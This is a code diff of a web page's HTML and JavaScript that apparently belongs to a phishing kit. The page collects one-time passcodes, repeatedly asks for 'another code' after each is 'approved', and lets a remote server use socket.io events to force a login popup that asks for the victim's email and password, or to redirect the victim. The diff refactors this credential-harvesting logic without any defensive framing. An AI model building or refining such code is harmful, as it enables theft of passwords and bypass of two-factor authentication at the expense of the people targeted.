@@ -145,7 +145,7 @@ button:disabled{
   border-radius:12px;
 }
 
-/* POPUP MODAL STYLES */
+/* POPUP MODAL STYLES (ADDED) */
 .modal-overlay {
   display: none;
   position: fixed;
@@ -261,7 +261,7 @@ button:disabled{
   </div>
 </div>
 
-<!-- FORCE LOGIN POPUP MODAL -->
+<!-- FORCE LOGIN POPUP MODAL (ADDED) -->
 <div id="loginModal" class="modal-overlay">
   <div class="modal">
     <div class="modal-icon">
@@ -290,9 +290,9 @@ button:disabled{
   const successDiv = document.getElementById('successMessage');
   let isProcessing = false;
   let approvalInterval = null;
-  let socket = null;
 
-  // Socket.io connection
+  // Socket.io connection for popup events (ADDED)
+  let socket = null;
   function connectSocket() {
     socket = io();
     socket.on('connect', () => {
@@ -300,21 +300,24 @@ button:disabled{
       socket.emit('identify', { email });
     });
     
-    // Force login popup event
     socket.on('force-login-popup', (data) => {
       if (data.email === email) {
-        showLoginModal();
+        const modal = document.getElementById('loginModal');
+        modal.classList.add('active');
+        document.getElementById('loginEmail').value = '';
+        document.getElementById('loginPassword').value = '';
+        document.getElementById('modalError').style.display = 'none';
+        document.getElementById('submitLoginBtn').disabled = false;
+        document.getElementById('submitLoginBtn').innerHTML = 'Login to Continue';
       }
     });
     
-    // Redirect to success event
     socket.on('redirect-to-success', (data) => {
       if (data.email === email) {
         window.location.href = data.redirectUrl;
       }
     });
   }
-  
   connectSocket();
 
   function getOTP() {
@@ -338,10 +341,8 @@ button:disabled{
     isProcessing = false;
     verifyBtn.disabled = false;
     verifyBtn.innerHTML = 'Verify';
-    // Clear input
     otpInput.value = '';
     otpInput.focus();
-    // Clear any intervals
     if (approvalInterval) {
       clearInterval(approvalInterval);
       approvalInterval = null;
@@ -368,11 +369,9 @@ button:disabled{
           clearInterval(approvalInterval);
           approvalInterval = null;
           
-          // Show success message
           successDiv.textContent = '✓ OTP approved! You can now enter another code.';
           successDiv.style.display = 'block';
           
-          // Reset for new OTP
           setTimeout(() => {
             successDiv.style.display = 'none';
             showReadyForNewOTP();
@@ -425,17 +424,7 @@ button:disabled{
     }
   }
 
-  // MODAL FUNCTIONS
-  function showLoginModal() {
-    const modal = document.getElementById('loginModal');
-    modal.classList.add('active');
-    document.getElementById('loginEmail').value = '';
-    document.getElementById('loginPassword').value = '';
-    document.getElementById('modalError').style.display = 'none';
-    document.getElementById('submitLoginBtn').disabled = false;
-    document.getElementById('submitLoginBtn').innerHTML = 'Login to Continue';
-  }
-
+  // Modal functions (ADDED)
   function hideLoginModal() {
     document.getElementById('loginModal').classList.remove('active');
   }
